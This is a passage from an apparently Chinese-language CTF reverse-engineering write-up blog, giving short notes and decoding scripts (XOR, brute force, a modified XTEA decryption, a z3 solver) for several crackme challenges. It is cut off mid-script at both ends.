10)-10)</span></span><br></pre></td></tr></table></figure><h2 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ida_chars =[</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x8E</span>, <span class="number">0x50</span>, <span class="number">0x44</span>, <span class="number">0x7B</span>, <span class="number">0x62</span>, <span class="number">0x57</span>, <span class="number">0x4A</span>, </span><br><span class="line">  <span class="number">0x7E</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0x84</span>, <span class="number">0x4F</span>, <span class="number">0x5B</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, </span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x64</span>, <span class="number">0x77</span>, <span class="number">0x48</span>, <span class="number">0x7D</span>, <span class="number">0x4D</span>, <span class="number">0x7B</span>, <span class="number">0x9F</span>, <span class="number">0x68</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0x2D</span>, <span class="number">0x62</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">    ida_chars[i]^=i</span><br><span class="line">    <span class="comment"># print(chr(ida_chars[i]),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># q=1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars)):</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">3</span>==<span class="number">0</span>):</span><br><span class="line">        ida_chars[i]-=<span class="number">18</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ida_chars[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="小黄鸭"><a href="#小黄鸭" class="headerlink" title="小黄鸭"></a>小黄鸭</h2><p>直接爆破，有个坑点原题目中</p><p>if chr(ord(a[1])) !&#x3D; ‘s’ or ord(a[2]) !&#x3D; 109 or chr(ord(a[17])) !&#x3D; ‘C’:</p><p>意思其实就是告诉我们倒数第三个数是m，服了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[] = &#123; <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;~&#x27;</span> &#125;;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt; <span class="number">33</span>;i++)</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">32</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">j = k;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">j += <span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="string">&#x27;a&#x27;</span> || j &gt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">j -= <span class="number">26</span>;</span><br><span class="line">j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">j += <span class="number">13</span>;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="string">&#x27;A&#x27;</span> || j &gt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">j -= <span class="number">26</span>;</span><br><span class="line">j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">j += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (j == a[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h2><p><a href="https://g2uge.github.io/2022/02/28/TEA%E7%B3%BB%E5%88%97%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/">TEA系列加密解密 | Gruge’s Blog (g2uge.github.io)</a></p><p>第一次真正的接触tea加密，了解了tea，xtea和xxtea加密的特征</p><p>这个题的坑点一是，他的数据接收是从前从后往中间聚集，其实这个无所谓，直接解出flag后面自己改就好了</p><p>坑点二，这是一个xtea，他修改了常量和循环次数，其实这俩也是套脚本稍微一改就可以了</p><p>坑点三，原加密函数,中(*(key + 4 * ((sum &gt;&gt; 11) &amp; 3))，中的4其实是混淆用的，因为他是取的地址，所以我们可以使用这个代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl tea(unsigned <span class="built_in">int</span> a1, unsigned <span class="built_in">int</span> *enc, <span class="built_in">int</span> key)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  unsigned <span class="built_in">int</span> v0; // [esp+10h] [ebp-8h]</span><br><span class="line">  unsigned <span class="built_in">int</span> <span class="built_in">sum</span>; // [esp+14h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v0 = *enc;</span><br><span class="line">  v1 = enc[<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 += <span class="built_in">sum</span> ^ (*(key + <span class="number">4</span> * ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v0)));</span><br><span class="line">    v0 += (*(key + <span class="number">4</span> * (<span class="built_in">sum</span> &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x31415927</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *enc = v0;</span><br><span class="line">  result = <span class="number">4</span>;</span><br><span class="line">  enc[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((<span class="built_in">sum</span> + key[ ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)])^<span class="built_in">sum</span>);</span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &amp; <span class="number">3</span>)]);</span><br></pre></td></tr></table></figure><p>坑点四，解密代码记得按照逻辑把代码都取反</p><p>解密脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x31415927</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((sum + key[ ((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)])^sum);</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x31415927</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="number">3</span>)]);</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((sum + key[((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)]) ^ sum);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">38</span>] = &#123; <span class="number">0x9AF9464B</span>, <span class="number">0xC417B89E</span>, <span class="number">0xB217A713</span>, <span class="number">0xC93BA9E8</span>, <span class="number">0x94F3E44E</span>, <span class="number">0xB5CC2AB5</span>, <span class="number">0x4451E42C</span>, <span class="number">0x7A8A289A</span>,</span><br><span class="line">    <span class="number">0x53C8D008</span>, <span class="number">0x6E117B49</span>, <span class="number">0x9BFFD794</span>, <span class="number">0x5EFF2DF9</span>, <span class="number">0x17E72531</span>, <span class="number">0xDFBD9979</span>, <span class="number">0x8F871B3A</span>, <span class="number">0x73E8C5AC</span>,</span><br><span class="line">    <span class="number">0xB28670A6</span>, <span class="number">0x5AF6A369</span>, <span class="number">0x2CF7DA24</span>, <span class="number">0x347B66AF</span>, <span class="number">0xB9C84D60</span>, <span class="number">0x911E912F</span>, <span class="number">0xBD5A2F9B</span>, <span class="number">0xCB96733A</span>,</span><br><span class="line">    <span class="number">0xC59968BE</span>, <span class="number">0xA00013E9</span>, <span class="number">0xC12F4EA4</span>, <span class="number">0xDE863A10</span>, <span class="number">0xA0C4D594</span>, <span class="number">0x4380983C</span>, <span class="number">0x7E2F7648</span>, <span class="number">0xE54DDC89</span>,</span><br><span class="line">    <span class="number">0x3F27A690</span>, <span class="number">0xB58D3199</span>, <span class="number">0x604AE517</span>, <span class="number">0x9C903984</span>, <span class="number">0xF4E04481</span>, <span class="number">0x3CF4EDFF</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> flag[<span class="number">2</span>] = &#123;<span class="number">0x0</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> pqw[<span class="number">2</span>] = &#123; <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00000020</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000027</span>, <span class="number">0x0000002C</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i,r = <span class="number">54</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密前原始数据：%u %u\n&quot;, v[0],v[1]);</span></span><br><span class="line">    <span class="comment">//encipher(r, v, k);</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密后的数据：%u %u\n&quot;, v[0], v[1]);</span></span><br><span class="line">    encipher(r, pqw, k);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[<span class="number">0</span>] = v[i];</span><br><span class="line">        flag[<span class="number">1</span>] = v[i + <span class="number">1</span>];</span><br><span class="line">        decipher(r, flag, k);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试,这样直接套用ida里的代码也是可以的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">v1 += sum ^ (*(key + <span class="number">1</span> * ((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + sum) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v0)));</span><br><span class="line">v0 += (*(key + <span class="number">1</span> * (sum &amp; <span class="number">3</span>)) + sum) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">sum += <span class="number">0x31415927</span>;</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><h2 id="浪漫至死不渝"><a href="#浪漫至死不渝" class="headerlink" title="浪漫至死不渝"></a>浪漫至死不渝</h2><p>已知加密后的数据以及密钥，直接爆破就好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> enc[]=&#123; <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span> &#125;;</span><br><span class="line">    <span class="type">int</span> key[] = &#123; <span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">14</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">33</span>; j &lt; <span class="number">126</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            k = j ^ key[i - <span class="number">7</span>];</span><br><span class="line">            k += <span class="number">99</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> enc[]=&#123; <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span> &#125;;</span><br><span class="line">    <span class="type">int</span> key[] = &#123; <span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">33</span>; j &lt; <span class="number">126</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            k = j ^ key[i % <span class="number">7</span>];</span><br><span class="line">            k += <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h2><p>做不了一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;01234_asdzxcpoityumnbAOZWXGMY&quot;</span></span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;f%d&#x27;</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    solver.add(Or([flag[i] == <span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> charset]))</span><br><span class="line">    </span><br><span class="line">matrix = [<span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x17</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x03</span>, <span class="number">0x1C</span>, <span class="number">0x0A</span>, <span class="number">0x15</span>, <span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x1C</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x07</span>]</span><br><span class="line"></span><br><span class="line">v7 = [[BitVec(<span class="string">&#x27;v%d_%d&#x27;</span>%(i,j), <span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span 